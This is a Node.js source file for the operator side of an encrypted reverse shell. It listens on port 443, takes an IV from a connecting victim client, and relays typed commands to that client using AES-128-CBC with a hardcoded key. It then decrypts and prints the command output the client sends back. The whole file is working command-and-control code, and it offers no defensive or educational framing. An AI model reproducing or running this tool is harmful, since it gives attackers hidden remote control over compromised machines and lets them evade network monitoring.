const net = require('net');
const crypto = require('crypto');
const readline = require('readline');

const HOST = '192.168.36.128';
const PORT = 443;
const KEY = Buffer.from('AE50o00ooo00K3Y!');
let IV = null;
let ivReceived = false;

function encrypt(text) {
  const cipher = crypto.createCipheriv('aes-128-cbc', KEY, IV);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return encrypted;
}

function decrypt(enc) {
  const decipher = crypto.createDecipheriv('aes-128-cbc', KEY, IV);
  let decrypted = decipher.update(enc, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

const server = net.createServer(socket => {
  console.log('Client connected:', socket.remoteAddress);

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: 'shell> '
  });

  rl.prompt();

  socket.once('data', ivData => {
    try {
      IV = Buffer.from(ivData.toString(), 'hex');
      ivReceived = true;
      console.log('[+] Received IV from client:', IV.toString('hex'));

      socket.on('data', data => {
        try {
          const decrypted = decrypt(data.toString());
          console.log(`\n[Client output]:\n${decrypted}`);
          rl.prompt();
        } catch (e) {
          console.error('Decrypt error:', e.message);
        }
      });

      rl.on('line', line => {
        if (!ivReceived) return console.log('IV not received yet.');
        if (line.trim() === 'exit') {
          socket.end();
          rl.close();
          return;
        }
        const encryptedCmd = encrypt(line.trim());
        socket.write(encryptedCmd);
      });

    } catch (e) {
      console.error('Invalid IV from client');
      socket.destroy();
    }
  });

  socket.on('close', () => {
    console.log('Client disconnected');
    rl.close();
  });

  socket.on('error', err => {
    console.error('Socket error:', err.message);
    rl.close();
  });
});

server.listen(PORT, HOST, () => {
  console.log(`Server listening on ${HOST}:${PORT}`);
});
